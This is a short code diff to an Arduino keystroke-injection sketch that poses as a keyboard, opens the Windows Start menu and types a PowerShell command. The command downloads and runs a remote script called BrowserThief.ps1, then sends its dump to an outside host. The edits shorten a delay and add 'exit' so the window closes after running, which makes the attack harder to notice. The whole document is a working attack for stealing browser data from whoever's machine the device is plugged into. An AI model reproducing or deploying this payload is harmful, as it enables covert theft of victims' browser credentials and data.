@@ -4,7 +4,7 @@
 void setup() {
 
   Keyboard.begin();
-  delay(1000);
+  delay(500);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
@@ -13,7 +13,7 @@ void setup() {
   delay(100);
   typeKey(KEY_RETURN);
   delay(500);
-  Keyboard.print("iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq https://dump.silvercryptor.xyz");
+  Keyboard.print("iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq https://dump.silvercryptor.xyz;exit");
   delay(100);
   typeKey(KEY_RETURN);
   Keyboard.end();
